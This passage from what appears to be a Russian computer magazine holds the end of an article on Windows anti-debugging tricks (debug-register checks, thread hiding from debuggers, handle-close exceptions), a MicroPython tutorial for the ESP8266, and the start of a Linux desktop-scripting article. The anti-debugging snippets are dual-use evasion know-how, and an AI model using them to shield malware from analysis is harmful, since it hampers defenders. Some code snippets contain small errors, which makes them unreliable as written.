GetThreadContext(GetCurrentThread(), context);
if (ctx.Dr0 != 0 ||
ctx.Dr1 != 0 ||
ctx.Dr2 != 0 ||
ctx.Dr3 != 0)
std::cout << "Debugger detected!\n";


NTSETINFORMATIONTHREAD
Еще один нетривиальный метод анти отладки основан на передаче флага
HideFromDebugger (находится в структуре _ETHREAD за номером 0x11) в фун‐
кцию NtSetInformationThread. Вот как выглядит про тотип функции:


NTSTATUS ZwSetInformationThread(
_In_ HANDLE          ThreadHandle,
_In_ THREADINFOCLASS ThreadInformationClass,
_In_ PVOID           ThreadInformation,
_In_ ULONG           ThreadInformationLength
);

Этот прием спрячет наш поток от отладчика, переставая отправлять ему отла‐
дочные события, например такие, как сра батывание точек останова. Особен‐
ность этого метода в том, что он универсален и работает благодаря штатным
возможностям ОС. Вот код, который реализует отсоединение главного
потока программы от отладчика:


NTSTATUS stat = NtSetInformationThread(GetCurrentThread(), 0x11, NULL
, 0);


NtCreateThreadEx
Подобно предыдущей работает и функция NtCreateThreadEx. Она появи‐
лась в Windows начиная с Vista. Ее тоже можно использовать в качестве
готового инструмента для препятствия отладке. Принцип действия схож
с NtSetInformationThread —  при  переда че  параметра  THREAD_CRE‐
ATE_FLAGS_HIDE_FROM_DEBUGGER  в  поле  CreateFlags  процесс  будет
невидим для дебаггера. Прототип функции:


NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateThreadEx (
_Out_ PHANDLE ThreadHandle,
_In_ ACCESS_MASK DesiredAccess,
_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
_In_ HANDLE ProcessHandle,
_In_ PVOID StartRoutine,
_In_opt_ PVOID Argument,
_In_ ULONG CreateFlags,
_In_opt_ ULONG_PTR ZeroBits,
_In_opt_ SIZE_T StackSize,
_In_opt_ SIZE_T MaximumStackSize,
_In_opt_ PVOID AttributeList
);

Код отключения отладчи ка:


HANDLE hThr = 0;
NTSTATUS status = NtCreateThreadEx(&hThr,
THREAD_ALL_ACCESS, 0, NtCurrentProcess,
(LPTHREAD_START_ROUTINE)next, 0,
THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER, 0, 0, 0, 0);

После этого начинает работать функция next() из WinAPI, которая находится
в отдельном невидимом для отладчика треде.


SEDEBUGPRIVILEGE
Один из признаков отладки приложения — получение приложением привиле‐
гии SeDebugPrivilege. Что бы понять, есть ли такая привилегия у нашего
процесса, можно, например, попытать ся открыть какой‐нибудь системный
процесс. По традиции пробуем открыть csrss.exe. Для этого используем фун‐
кцию  WinAPI  OpenProcess  с  парамет ром  PROCESS_ALL_ACCESS.  Вот
как реализуется этот метод (в переменной Id_From_csrss находится ID
csrss.exe):


HANDLE hDebug = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Id_From_csrss)
;
if hDebug != NULL) std::cout << "Debugger detected!\n";


SETHANDLEINFORMATION
Функция SetHandleInformation применяется для установки свойств дес‐
криптора объектов, на который ука зыва ет hObject. Прототип функции выг‐
лядит следующим образом:


BOOL SetHandleInformation(
  HANDLE hObject,
  DWORD dwMask,
  DWORD dwFlags
);

Типы объектов различны — например, это может быть задание, отоб ражение
файла или мьютекс. Мы можем этим вос поль зоваться: соз дадим мьютекс
с флагом HANDLE_FLAG_PROTECT_FROM_CLOSE и попробуем его закрыть,
попутно пытаясь пой мать исключение. Если исклю чение будет поймано, то
процесс отлаживается.


HANDLE hMyMutex = CreateMutex(NULL, FALSE, _T("MyMutex"));
SetHandleInformation(hMyMutex, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE
_FLAG_PROTECT_FROM_CLOSE);
__try {
CloseHandle(hMutex);
}
__except (HANDLE_FLAG_PROTECT_FROM_CLOSE) {
    std::cout << "Debugger detected!\n";
}


ЗАКЛЮЧЕНИЕ
Мы рассмотрели несколько способов защиты при ложения от отладки. Я ста‐
рался показать разные методы отладки и рассказать, как они работают
на низком уровне. Чтобы лучше раз бираться в том, что происходит, ты должен
понимать, как работает ОС, как приложение взаимодействует с разными
структурами окружения потока и процесса. Надеюсь, моя статья поможет
тебе в этом и научит более эффективно защищать приложе ния от любопыт‐
ных реверсеров и автоматичес ких систем распаковки и анализа.
КОДИНГ
PYTHON
 ДЛЯ МИКРОКОНТРОЛЛЕРОВ





            УЧИМСЯ ПРОГРАММИРОВАТЬ
            ОДНОПЛАТНЫЕ КОМПЬЮТЕРЫ
             НА ЯЗЫКЕ ВЫСОКОГО УРОВНЯ  Виктор Паперно
  vpap1997@inbox.ru





Шутники говорят, что после трудового дня за компьютером
типичный программист едет домой, садится за ПК и таким
образом отдыхает. А ведь истина на самом деле куда ужас‐
нее этой шутки: многие из нас, приходя с работы, посвящают
оставшееся до сна время... программированию микрокон‐
троллеров.  :) Обывателям не понять, но Arduino, Teensy
или ESP — действительно очень неплохое хобби. Их единс‐
твенный недос таток — необходимость прог раммировать
на достаточно низком уровне, если не на Assembler, то на Ar‐
duino C или Lua. Но теперь в списке ЯП для микроконтрол‐
леров появился Python. Точнее, MicroPython. В этой статье я
постараюсь максимально продемонстрировать  его  воз‐
можности.


С ЧЕГО ВСЕ НАЧАЛОСЬ?
Все началось с кампании на Kickstarter. Дэмьен Джордж (Damien George),
разработчик из Англии, спроектировал микроконтроллерную плату, пред‐
назначенную специально для Python. И кампания «выстре лила». Изначально
была заяв лена сумма в 15 тысяч фунтов стерлингов, но в результате было
собрано в шесть с половиной раз больше — 97 803 фунта стерлингов.


А ЧЕМ ЭТА ПЛАТА ЛУЧШЕ?
Автор проекта приводил целый ряд преимуществ своей платформы в срав‐
нении с Raspberry Pi и Arduino:
 • Мощность — MP мощ нее в сравнении с микроконтрол лером Arduino,
   здесь используются 32‐разрядные ARM‐процессоры типа STM32F405
   (168 МГц Cortex‐M4, 1 Мбайт флеш‐памяти, 192 Кбайт ОЗУ).
 • Простота в исполь зовании — язык MicroPython основан на Python, но нес‐
   колько упрощен, для того чтобы команды по управлению датчиками
   и моторами можно было писать буквально в нес колько строк.
 • Отсутствие компилятора — чтобы запус тить программу на платформе Mi‐
   croPython, нет необ ходимости устанавливать на компьютер допол нитель‐
   ное ПО. Плата определяется ПК как обычный USB‐накопитель — стоит
   закинуть на него тексто вый файл с кодом и перезагрузить, программа тут
  же начнет исполняться. Для удобства все‐таки можно установить на ПК
   эмулятор терминала, который дает возможность вписывать элементы кода
   с компьютера непос редственно на платформу. Если использовать его,
   тебе даже не придется перезагружать плату для проверки программы,
   каждая строка будет тут же исполняться микроконтроллером.
 • Низкая стоимость — в сравнении с Raspberry Pi платформа PyBoard нес‐
   колько дешевле и, как следс твие, доступнее.
 • Открытая платформа — так же как и Arduino, PyBoard — открытая плат‐
   форма, все схемы будут находиться в открытом доступе, что подразуме‐
   вает возможность спроектировать и соз дать подобную плату самому
   в зависимости от потребнос тей.


И ЧТО, ТОЛЬКО ОФИЦИАЛЬНАЯ ПЛАТА?
Нет. При всех своих достоинс твах PyBoard (так называется плата от раз‐
работчика MicroPython) — довольно дорогое удовольствие. Но благодаря
открытой платформе на многих популярных платах уже можно запустить Mi‐
croPython, собранный специально для нее. В данный момент сущес твуют вер‐
сии:
 • для BBC micro:bit — британская разработка, позиционируется как офи‐
   циальное учебное пособие для уроков информатики;
 • Circuit Playground Express — раз работка извес тной компании  Adafruit.
   Это плата, включающая в себя светоди оды, датчики, пины и кнопки.
  По умолчанию прог раммируется с помощью  Microsoft MakeCode  for
    Adafruit. Это блочный (похожий на Scratch) редактор «кода»;
 • ESP8266/ESP32 — одна из самых популярных плат для IoT‐разработки. Ее
  можно было программировать на Arduino C и Lua. А сегодня мы попробу‐
  ем установить на нее MicroPython.





                         Плата ESP8266


ПОДГОТОВКА К РАБОТЕ
Перед тем как писать программы, нуж но настроить плату, установить на нее
прошивку, а также установить на компьютер необходимые программы.


             INFO

                     Все  примеры  проверялись  и  тестировались
                       на следующем обо рудовании:
                  •плата NodeMCU ESP8266‐12E;
                  •драйвер моторов L293D;
                  •I2C‐дисплей 0,96″ 128 × 64;
                  •Adafruit NeoPixel Ring 16.



Про шивка кон трол лера
Для прошивки платы нам понадобится Python. Точнее, даже не он сам, а ути‐
лита esptool, распространяемая с помощью pip. Если у тебя установлен
Python  (неважно,  какой версии),  открой  терминал  (командную  строку)
и набери:


pip install esptool

После установки esptool надо сделать две вещи. Первое — скачать с офи‐
циального сайта версию прошивки для ESP8266. И второе — определить
адрес платы при подключении к компь ютеру. Самый простой способ — под‐
клю читься к компьюте ру, открыть Arduino IDE и пос мотреть адрес в спис ке
портов.
  Для облегчения восприятия адрес платы в примере будет /dev/ttyUSB0,
а файл прошивки переименован в esp8266.bin и лежит на рабочем столе.
  Открываем терминал (командную строку) и перехо дим на рабочий стол:


cd Desktop

Форматируем флеш‐память платы:


esptool.py ‐‐port /dev/ttyUSB0 erase_flash

Если при форматировании воз никли ошиб ки, значит, нужно включить режим
прошивки вручную. Зажима ем на пла те кноп ки reset и ﬂash. Затем отпускаем
reset и, не отпуская ﬂash, пытаемся отформатировать ся еще раз.
  И загружаем прошивку на плату:


esptool.py ‐‐port /dev/ttyUSB0 ‐‐baud 460800 write_flash ‐‐flash_size
=detect 0 esp8266.bin


ВЗАИМОДЕЙСТВИЕ С ПЛАТОЙ
Все взаимодействие с платой может про исходить несколькими способами:
 • через Serial‐порт;
 • через web‐интерпретатор.

При подключении через Serial‐порт пользователь в своем терминале (в своей
командной строке) видит практичес ки обычный интерпретатор Python.





                  Подключение через SerialPort

Для подклю чения по Serial есть раз ные программы. Для Windows можно
использовать PuTTY или TeraTerm. Для Linux — picocom или minicom. В качес‐
тве кросс‐платформенного решения можно использовать монитор порта Ar‐
duino IDE. Главное — правильно определить порт и указать скорость переда‐
чи данных 115200.


picocom /dev/ttyUSB0 ‐b115200

Кроме этого, уже создано и выложено на GitHub несколько программ,
облегчающих разработку, например EsPy. Кроме Serial‐порта, он включает
в себя редактор Python‐файлов с подсвет кой синтаксиса, а также файловый
менеджер, позволяющий ска чивать и загружать файлы на ESP.





                              EsPy IDE

Но все перечисленные способы хороши лишь тогда, когда у нас есть воз‐
можность напрямую подключиться к устрой ству с помощью кабеля. Но плата
может быть интегрирова на в какое‐либо устройство, и раз бирать его только
для того, чтобы обновить программу, как‐то неоп тимально. Наверное, имен‐
но для таких случаев и был создан WebREPL. Это способ взаимодействия
с платой через браузер с любого устройства, находя щегося в той же локаль‐
ной сети, если у платы нет статичес кого IP, и с любого компьютера, если такой
IP присутствует. Давай нас троим WebREPL. Для этого необходимо, подклю‐
чившись к плате, набрать


import webrepl_setup

Появится сообщение о статусе автозапуска WebREPL и вопрос, включить
или выключить его авто запуск.


WebREPL daemon auto‐start status: enabled
Would you like to (E)nable or (D)isable it running on boot?
(Empty line to quit)
>

После ввода q появляется сообщение о выставлении пароля доступа:


To enable WebREPL, you must set password for it
New password (4‐9 chars):

Вводим его, а затем подтвержда ем. Теперь пос ле перезагрузки мы сможем
подклю читься к плате по Wi‐Fi.
   Так как мы не настроили подклю чение платы к Wi‐Fi‐сети, она работает
в качестве точки доступа. Имя Wi‐Fi‐сeти — MicroPython‐******, где звез‐
дочками я заменил часть MAC‐адреса. Подклю чаемся к ней (пароль — mi‐
cropythoN).
  Открываем WebREPL и нажимаем на Connect. После ввода пароля мы
попадаем в тот же интерфейс, что и при пря мом подключении. Кроме этого,
в WebREPL есть интерфейс для загрузки файлов на плату и скачивания фай‐
лов на компьютер.





                         WebRERL


             INFO

                    Среди файлов, загруженных на плату, есть стан‐
                      дартные:
                  •boot.py — скрипт, который загружается пер‐
                     вым при включении платы. Обычно в  него
                          вставляют   функции   для   инициализации
                         модулей,  подключения  к  Wi‐Fi  и  запуска
                      WebREPL;
                  •main.py — основной скрипт, который запус‐
                           кается  сразу  после выполнения boot.py ,
                         в него записывается основная прог рамма.



НАЧИНАЕМ РАЗРАБОТКУ
Hello world
Принято, что первой написанной на новом языке программирования дол жна
быть программа, выводя щая Hello world. Не будем отходить от традиции
и выведем это сооб щение с помощью азбуки Морзе.


import machine
import time
pin = machine.Pin(2,machine.Pin.OUT)
def dot_show():
    pin.off()
    time.sleep(1)
    pin.on()
def dash_show():
    pin.off()
    time.sleep(2)
    pin.on()
Hello_world = '**** * *‐** *‐** ‐‐‐    *‐‐ ‐‐‐ *‐* *‐** ‐**'
for i in Hello_world:
    if i=="*":
        dot_show()
    elif i=='‐':
        dash_show()
    else:
        time.sleep(3)
    time.sleep(0.5)

Итак, что же происходит? Сначала подключаются библиотеки: стандартная
Python‐библиотека time и специализированная machine. Эта библиоте ка
отвечает за взаимодействие с GPIO. Стандартный встроенный светодиод
располагается на втором пине. Подключаем его и указываем, что он работает
на выход. Если бы у нас был подключен какой‐нибудь датчик, то мы бы ука‐
зали режим работы IN.
  Следующие две функции отвечают за включение и выключение светоди‐
ода на определенный интервал времени. Наверное, интересно, почему я сна‐
чала выключаю светодиод, а потом включаю? Мне тоже очень интересно,
почему сигнал для данного светодиода инвертирован... Оставим это на
совести китайских сборщиков. На самом деле команда pin.off() включает
светодиод, а pin.on() — отключает.
   Ну а дальше все прос то: заносим в переменную Hello_world нашу строчку,
записанную кодом Морзе, и, пробегаясь по ней, вызываем ту или иную фун‐
кцию.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
        PYTHON              ДЛЯ
МИКРОКОНТРОЛЛЕРОВ
         УЧИМСЯ ПРОГРАММИРОВАТЬ ОДНОПЛАТНЫЕ
        КОМПЬЮТЕРЫ НА ЯЗЫКЕ ВЫСОКОГО УРОВНЯ





Радуж ный мир
Одна из стандар тных библиотек, поставляемых с MicroPython, — библиотека
NeoPixel. Она используется для работы с RGB‐светодиодами, выпус каемыми
компанией Adafruit. Для подключения нужно три пина. Один — земля, вто‐
рой — питание (3,3 В), а третий необходим для управления. У меня это GPI‐
O4, а ты можешь выбрать любой.





                    Схема подключения NeoPixel


import machine, neopixel,time,urandom
my_neopixel_ring = neopixel.NeoPixel(machine.Pin(4), 16)
def color_all(neopixel_ring, color):
    for i in range(neopixel_ring.n):
        neopixel_ring[i] = color
    neopixel_ring.write()
def color_all_slow(neopixel_ring, color):
    for i in range(neopixel_ring.n):
        neopixel_ring[i] = color
        neopixel_ring.write()
        time.sleep(0.5)
def color_random(neopixel_ring):
    for i in range(neopixel_ring.n):
        color =  (urandom.getrandbits(8),urandom.getrandbits(8),
urandom.getrandbits(8))
        neopixel_ring[i] = color
    neopixel_ring.write()
def disable(neopixel_ring):
    for i in range(neopixel_ring.n):
        neopixel_ring[i] = (0,0,0)
    neopixel_ring.write()
def show(neopixel_ring):
    RAINBOW_COLORS = [(255,0,0),(255, 128, 0),(255,255,0),(0,255,0),(
0,255,255),(0,0,255), (255,0,255)]
    for i in RAINBOW_COLORS:
        color_all(neopixel_ring,i)
        time.sleep(0.5)
    time.sleep(5)
    disable(neopixel_ring)
    for i in RAINBOW_COLORS:
        color_all_slow(neopixel_ring,i)
        time.sleep(0.5)
    for i in range(100):
        color_random(neopixel_ring)
        time.sleep(0.5)
    disable(neopixel_ring)

Ух, сколько здесь всего! Начнем с под ключения. Для создания объ екта типа
NeoPixel нужно указать два параметра: пин и количество светодиодов. Све‐
тодиоды в NeoPixel адресные, и мож но подклю чать много модулей пос‐
ледовательно. По сути, это массив, в каждом элементе которого хранится
кортеж определенного формата (RGB).
  Функция color_all окрашивает все светодиоды в один цвет. Причем
для визуального наблюдателя это про исходит «мгно венно», а вот в функции
color_all_slow  вклю чение  будет происходить по одному  све тодиоду
с задержкой в пол секунды. Это зависит от того, ког да вызывается функция
write(). Именно она отвечает за «проявление» цвета.
  Следующая функция, color_random, окрашивает все светодиоды в раз‐
ные случайные цвета. Именно здесь замет но отличие от версии Python,
запускаемой на компьютере. Как бы мы сгенерировали случайный кортеж
на компьютере:


import random
color = (random.randrage(256),random.randrage(256),random.randrage(
256))

Но здесь нет модуля random. Зато есть urandom. C помощью функции ge‐
trandbits можно получить случайный набор бит определенной длины, то
есть случайное число в диапазоне от нуля до двойки в какой‐то степени.
В данном случае — до вось ми.
  Для того чтобы выключить светодиод, необ ходимо задать ему цвет, рав‐
ный (0,0,0). Ой. А как же яркость? Ведь ког да цвет задается с помощью RGB,
обычно присутствует такой параметр, как яркость (прозрачность). Здесь она
задается с помощью обыкновенной матема тики:
 • (255,255,255) — белый на максимальной яркости;
 • (128,128,128) — белый с яркостью 50%;
 • (64,64,64) — белый с яркостью 25%.

Функция show — это просто демонстрационная функция, в которой показы‐
вается, как работают уже разобранные функции.


Монитор. Рисование, письмо и кал лиграфия
Очень часто неохота лезть на устройство, чтобы пос мотреть какие‐то данные.
Значит, их нужно куда‐то выводить. Например, на экран. :)


from ssd1306 import SSD1306_I2C
import machine
from writer import Writer
import freesans20
import time
WIDTH = const(128)
HEIGHT = const(64)
pscl = machine.Pin(4, machine.Pin.OUT)
psda = machine.Pin(5, machine.Pin.OUT)
i2c = machine.I2C(scl=pscl, sda=psda)
ssd = SSD1306_I2C(WIDTH, HEIGHT, i2c, 0x3c)
ssd.fill(1)
ssd.show()
time.sleep(0.5)
ssd.fill(0)
ssd.show()
ssd.line(40, 0, 40, HEIGHT, 1)
square_side = 40
ssd.fill_rect(0, 0, square_side, square_side, 1)
ssd.text('Hello', 50, 10)
wri2 = Writer(ssd, freesans20, verbose=False)
Writer.set_clip(True, True)
Writer.set_textpos(32, 64)
wri2.printstring('][akep\n')
ssd.show()

Для работы с монитором необходима биб лиотека ssd1306, ее можно заг‐
рузить с GitHub. Для подключения по протоко лу I2C нам необ ходимо два
пина, используем GPIO4 как scl, а GPIO5 как sda. Инициализиру ем I2C‐под‐
клю чение. Для проверки пос ле инициализации переменной i2c можно выз‐
вать функцию i2c.scan(). Если ты все правильно подключил, то в качестве
результата будет список вида [60]. Это номер I2C‐порта. Если увидел пус той
список — значит, какая‐то проблема с подклю чением. Что можно сделать
с экраном?
 • Заполнить одним цветом: белым — ssd.fill(1) или черным — ssd.
  fill(0) .
 • Обновить изображение на экра не — ssd.show() .
 • Нарисовать линию (x0,y0,x1,y1) толщиной t — ssd.line(x0,y0,x1,y1,
  t) .
 • Нарисовать пик сель заданного цвета по координатам — ssd.pixel(x,
  y,c) .
 • Нарисовать прямоуголь ник, задава емый начальной точкой, длинами сто‐
   рон и цветом — ssd.fill_rect(x0, y0, lenth, width, color).
 • Сделать надпись стандартным шриф том — ssd.text('', x0, y0).

Но у стандартного шриф та есть свои недос татки, поэтому на GitHub уже мож‐
но найти способ создавать и использовать свои шрифты. Для этого надо соз‐
дать свой шрифт с помощью  font‐to‐py.py, заг рузить созданный шрифт
и модуль Writer на устройство и использовать, как продемонс трировано
в примере.


Настраиваем Wi-Fi и управляем через сайт
Действительно, каждый раз подклю чаться к локальной сети платы неудобно.
Но можно настроить плату так, чтобы она подклю чалась к уже созданной Wi‐
Fi‐сети.


import network
sta_if = network.WLAN(network.STA_IF)
sta_if.active(True)
sta_if.connect('<your ESSID>', '<your password>')
sta_if.isconnected() ## True
sta_if.ifconfig() ##('192.168.0.2', '255.255.255.0', '192.168.0.1',
'8.8.8.8')

Здесь показано, как подключиться к заданной Wi‐Fi‐сети путем последова‐
тельного выполнения команд. Но ведь это очень монотонно. Официальное
руководство советует добавить следующую функцию в файл boot.py:


def do_connect():
    import network
    sta_if = network.WLAN(network.STA_IF)
    if not sta_if.isconnected():
        print('connecting to network...')
        sta_if.active(True)
        sta_if.connect('<essid>', '<password>')
        while not sta_if.isconnected():
            pass
    print('network config:', sta_if.ifconfig())

Отлично. Мы подключили нашу плату к интернету. Давай попробуем управлять
светодиодом с помощью обычного сай та. Нам не понадобятся никакие
модули вроде Flask или Djano. Только socket. Толь ко хардкор.


import socket
import machine
html = """<!DOCTYPE html>
<html>
<head> <title> ESP8266 Controller </title> </head>
<form>
<H1>ESP8266 Controller</H1>
<button name="LED" value="ON" type="submit">ON</button><br>
<button name="LED" value="OFF" type="submit">OFF</button>
</form>
</html>
"""
pin = machine.Pin(2, machine.Pin.OUT)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 80))
s.listen(5)
while True:
    conn, addr = s.accept()
    print("Connected with " + str(addr))
    request = conn.recv(1024)
    request = str(request)
    LEDON = request.find('/?LED=ON')
    LEDOFF = request.find('/?LED=OFF')
    if LEDON == 6:
        print('TURN LED0 ON')
        pin.off()
    if LEDOFF == 6:
        print('TURN LED0 OFF')
        pin.on()
    response = html
    conn.send(response)
    conn.close()

В начале записан HTML‐код странички. Там две кноп ки — одна на включение,
другая на выключение. По сути, они просто соз дают и отправляют POST‐зап‐
росы на сервер.
  После описания сайта опять подклю чаем встроенный светодиод, а затем
создаем сервер. Задача сервера — отлавливать запросы и, если в них
попадаются команды на включение/выключение светодиода, обрабаты вать
их.


Управле ние моторами
Мне кажется, что машинка на радиоуп равлении была, есть или будет у всех
(на этом моменте все, кто родился в начале восьмидесятых и раньше,
начинают смахивать слезинки — ведь пределом их мечтаний был шагающий
луноход без радиоуправления. ;) — Прим. ред.). И многие начинают свой путь
в DIY с создания такой игрушки. Это нас только популярное дело, что уже дав‐
но в продаже появились целые наборы, включающие в себя колесную плат‐
форму с креплениями под различные платы. Попробу ем создать машинку,
управляемую с помощью WebREPL.





                     Драйвер моторов L293D


from machine import Pin, PWM
pin1 = Pin(5, Pin.OUT)  # D1
pin2 = Pin(4, Pin.OUT)  # D2
pin3 = Pin(0, Pin.OUT)  # D3
pin4 = Pin(2, Pin.OUT)  # D4
BIN1 = PWM(pin1, freq=750)
BIN2 = PWM(pin3, freq=750)
AIN1 = PWM(pin2, freq=750)
AIN2 = PWM(pin4, freq=750)
speed = 700
def stop_all():
    for each in (BIN1, BIN2, AIN1, AIN2):
        each.duty(0)
def B(tmp1,tmp2):
    BIN1.duty(tmp1)
    BIN2.duty(tmp2)
def A(tmp1,tmp2):
    AIN1.duty(tmp1)
    AIN2.duty(tmp2)
def forward():
    B(speed,0)
    A(speed,speed)
def backward():
    B(speed,speed)
    A(speed,0)
def left():
    B(speed,0)
    A(speed,0)
def right():
    B(speed,speed)
    A(speed,speed)
commands = {'w':forward,'s':backward,'a':left,'d':right,'s':stop_all}
while True:
    a = input().lower()
    try:
        commands[a]()
    except:
        pass

Интересная особенность данного кода в том, что мы сначала подключаемся
к пинам, а затем уже на этих пинах соз даем PWM‐подключение к моторам.


Интернет вещей
Как‐то неловко вышло... ESP8266 позиционируется как плата для разработки
в сфере IoT, а мы пока ничего не сделали. Одно из базовых понятий IoT —
MQTT‐протокол. Что бы не тратить время на настройку своего MQTT‐сервера,
воспользуемся платформой Adafruit IO. А биб лиотека для работы с этим про‐
токолом уже вклю чена в сборку MicroPython и называ ется umqtt.
  Перед  непосредственно  прог рамми рова нием необходимо  нас троить
Adafruit IO. Регистрируемся, соз даем новый feed и называем его enable‐
field. Затем создаем новый Dashboard и добавляем на него кнопку‐перек‐
лючатель. При добавлении следует ука зать имя созданного нами feed’a.
Для подключения нам необходимо имя аккаунта и так называемый Active Key.


import network
from umqtt.simple import MQTTClient
import machine
pin = machine.Pin(2, machine.Pin.OUT)
def sub_cb(topic, msg):
   print(msg)
   if msg == b'ON':
      pin.off()
   elif msg == b'OFF':
      pin.on()
sta_if = network.WLAN(network.STA_IF)
sta_if.active(True)
sta_if.connect('<SSID>', '<PASSWORD>')
client = MQTTClient("my_device", "io.adafruit.com",user="<USER_LOGIN>
", password="<API‐KEY>", port=1883)
client.set_callback(sub_cb)
client.connect()
client.subscribe(topic="<USER_LOGIN>/feeds/<FEEDNAME>")
while True:
    client.wait_msg()

Для работы с внешним MQTT‐сервером необходимо подключение к Wi‐Fi‐
сети с доступом в интернет. Функция sub_cb(topic, msg) отвечает за то, что
происходит, если в задан ный топик приходит сообщение. После подключения
к  Wi‐Fi создается подключение  к MQTT‐серверу. Описываются  топики,
на которые подписан клиент, и запускается бесконечное ожидание сооб‐
щений в топике.


ЗАКЛЮЧЕНИЕ
MicroPython — очень молодой проект, но он уже достаточно популярен
и даже попал в список 30 Amazing Python Projects for the Past Year (v.2018).
И мне кажется, что это только начало, ведь на GitHub уже немало проектов,
написанных на MicroPython, а Adafruit даже раз работала свою версию, пред‐
назначенную для обучения, — CircuitPython.


        WWW

                  •Официальная  документация  по  MicroPython
                         для ESP8266
                    •Недавно вышедшая книга по MicroPython
                    •Описание работы с Adafruit IO
UNIXOID





                                                                   Илья Остапенко
                                                                              ostapenko.public@gmail.com
ДЕСКТОП
ПОД КОНТРОЛЕМ
УПРАВЛЯЕМ ГРАФИЧЕСКИМ СОФТОМ
ИЗ КОНСОЛИ И СКРИПТОВ




Linux‐системы обла дают очень широкими возможностями
для автоматизации рутин ных действий. В других статьях мы
уже показали массу самых разнообразных и стран ных при‐
меров,   включая   возможность   управления  машиной
с помощью календаря Google. Одна ко мы почти никогда
не говорили об автоматизации и скриптовании графичес‐
кого софта. А ведь во мно гих случаях им тоже можно
управлять из консоли и скрип тов.


WMCTRL
Скрестить мощь скриптов и красоту гра фики поможет wmctrl. С его помощью
можно изменять размер и расположение окон на экране, автоматизировать
смену рабочих столов или использовать информацию об откры тых окнах
в других скриптах.
  Основное преимущество wmctrl — полная незави симость от какого‐либо
оконного менеджера. Он вза имо действует с окна ми пос редством протокола
EWMH/NetWM, который поддерживают большинство оконных менеджеров.
  Не буду утомлять тебя рас ска зами о воз можнос тях утилиты и ее флагах,
а сразу покажу пример. Все знают о сущес твовании Yakuake и Tilda, спе‐
циальных эмуляторов терминала, которые можно разворачивать и сворачи‐
вать нажатием клавиши. С помощью wmctrl ты можешь наделить такими воз‐
можностями любой другой эмулятор терминала (например, Konsole из KDE).


#! /bin/bash
if [ `wmctrl ‐xl | grep ‐c Konsole` != 0 ]; then
    if [ ‐f /tmp/.Konsole.add ]; then
        wmctrl ‐r Konsole ‐b add,below
        rm /tmp/.Konsole.add
    else
        wmctrl ‐r Konsole ‐b add,above
        touch /tmp/.Konsole.add
    fi
else
    konsole
fi

Просто повесь его на клавиатурную комбинацию. Первое нажатие запустит
терминал, а все последующие будут сворачи вать/раз ворачивать его.
  Эмулятор терминала не единственное применение wmctrl в рамках пред‐
ставленного выше скрипта. На самом деле вмес то Konsole можно подставить
любую программу. А можно пойти дальше и задействовать в сценарии два
окна, например браузер и мессенджер, таким обра зом, чтобы в определен‐
ный момент работы в интернете нажатием клавиш можно было заставить
браузер подвинуться и освободить место под мессенджер и кинуть взгляд
на сообщения в чате.
   Чтобы этого добиться, сначала нуж но определить размеры окон обоих
приложений в каждом из двух требующихся сос тояний. Делается это с
помощью команды wmctrl ‐lG (перед этим растяни/сожми окна до нужных
размеров):


$ wmctrl ‐lG
0x0500001b  0 0    55   1280 726  N/A Проект OpenNet ‐ QupZilla
0x03000005  0 900  55   380  693  N/A Telegram (6)
$ wmctrl ‐lG
0x0500001b  0 0    55   900  693  N/A Проект OpenNet ‐ QupZilla
0x03000005  0 900  55   380  693  N/A Telegram (6)

Опция ‐G добавляет четыре дополнительных столбца в середине вывода
команды. В них отражены данные о смещении окон по осям X и Y, а также их
ширина и высота соот ветс твенно. В моем случае я сначала использовал дан‐
ные в точности, как их вывела команда. Но при подстановке в сценарий рас‐
положение окна QupZilla по оси Y по какой‐то причине отличалось от рас‐
четного, поэтому его пришлось немного подкорректировать вручную.


#!/bin/sh
if [ ‐f /tmp/.telega.half ]; then
    wmctrl ‐r Telegram ‐e '0,900,55,380,693' ‐b add,below
    wmctrl ‐r QupZilla ‐e '0,0,26,1280,726'
    rm /tmp/.telega.half
else
    wmctrl ‐r QupZilla ‐e '0,0,26,900,693'
    wmctrl ‐r Telegram ‐e '0,900,55,380,693' ‐b remove,below
    touch /tmp/.telega.half
fi

При первом запуске этот скрипт сожмет окно бра узера с правой стороны
и покажет в освободившемся прос транстве окно мессенджера. Второй
запуск закроет мессенджер и вернет окно браузера в прежнее состояние.





           Окна бра узера и мес сенджера на одном экране


XDOTOOL
Telegram, который мы использовали в примере с браузером и мес сендже‐
ром, сам по себе неплохо управляется сочетаниями клавиш. И все‐таки одно‐
го шортката мне не хватает. Того, который вос ста навливал бы окно из лотка.
Wmctrl не всегда способен решить эту задачу. И пока встроенные возможнос‐
ти мессенджера не могут нас порадовать подоб ной функциональностью,
поможет утилита xdotool. Она позволяет эму лиро вать действия мышью, а зна‐
чит, и повесить их на сочета ния клавиш.
  Поскольку рабочее окружение у меня Plasma, я соз дал еще один виджет
системного лотка, отключив в его нас тройках все пункты, кроме «Состояния
приложений», а всем элементам приложений, кро ме Telegram, указал пожиз‐
ненную невидимость («Всег да скрывать»). Сам же Telegram должен быть всег‐
да виден.





                Нас трой ки вто рого сис темного лотка

Осталось только определить координаты значка «Телеграма» при заблокиро‐
ванных виджетах, установив на него курсор мыши и выполнив в терминале
такую команду:


$ xdotool getmouselocation





                 Получение коор динат курсора

Из всего многооб разия полученных данных берем координаты X, Y (в моем
случае — 1238 и 776) и подставляем в команду, переме щающую курсор
мыши в заданное положение из любой области экрана и эмулиру ющую одно
нажатие левой кнопки.


#!/bin/sh
xdotool mousemove 1238 776 click 1 mousemove 640 400

Далее скрипт можно привязать к комбинации клавиш (или, как у меня,
к одной — Menu), чтобы при их нажатии появлялось окно программы. Пов‐
торное нажатие того же сочета ния клавиш вновь свернет окно Telegram
в трей. Для удобства навигации в скрипт добавлен возврат курсора мыши
в центр экрана.


XWININFO
Утилита xwininfo показывает на экране большое количество характерис тик
выбранного окна: ID, наз вание, раз меры, отсту пы от краев экрана, толщину
границ, цветовую палит ру и многое другое. Утилита wmctrl, содержащая
в строке параметров опцию :SELECT:, поз воляет применить указанные
параметры к окну, наведя на него курсор и щелкнув мышью:


 $ wmctrl ‐r :SELECT: ‐T <название>





XPROP
Часто используемая в раз личных сценари ях утилита xprop предназначена
